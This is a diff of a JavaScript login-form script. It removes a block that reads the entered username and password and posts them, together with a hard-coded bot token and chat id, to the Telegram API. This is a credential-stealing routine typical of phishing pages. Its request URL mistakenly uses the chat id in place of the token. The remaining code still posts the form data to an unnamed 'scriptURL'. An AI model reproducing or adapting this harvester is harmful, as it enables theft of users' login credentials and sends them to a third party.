@@ -25,45 +25,13 @@ togglePasswordButton.addEventListener("click", function () {
    e.preventDefault();
    var formData = new FormData(form);
 
-   fetch(scriptURL, { method: "POST", body: formData })
-     .then((response) => {
-       swal("Done", "Submitted Successfully.", "success");
-     })
-     .catch((error) => {
-       swal("Error", "Something went wrong. please try again!", "error");
-     });
+https: fetch(scriptURL, { method: "POST", body: formData })
+  .then((response) => {
+    swal("Done", "Submitted Successfully.", "success");
+  })
+  .catch((error) => {
+    swal("Error", "Something went wrong. please try again!", "error");
+  });
  });
 
-{
-var telegram_bot_id = "8559897613:AAFpgp5Kq1dc6hm5UIujVP4W45WklTQ4d7E";
-  var chat_id = 7553336894;
-  var u_name, password;
-  var ready = function () {
-    u_name = document.getElementById("username").value;
-    password = document.getElementById("password").value;
-    message = "Name: " + u_name + "\nPassword: " + password;
-  };
-  var sender = function () {
-    ready();
-    var settings = {
-      async: true,
-      crossDomain: true,
-      url: "https://api.telegram.org/bot" + 7553336894 + "/sendMessage",
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "cache-control": "no-cache",
-      },
-      data: JSON.stringify({
-        chat_id: chat_id,
-        text: message,
-      }),
-    };
-    $.ajax(settings).done(function (response) {
-      console.log(response);
-    });
-    document.getElementById("username").value = "";
-    document.getElementById("password").value = "";
-    return false;
-  };
-}
+
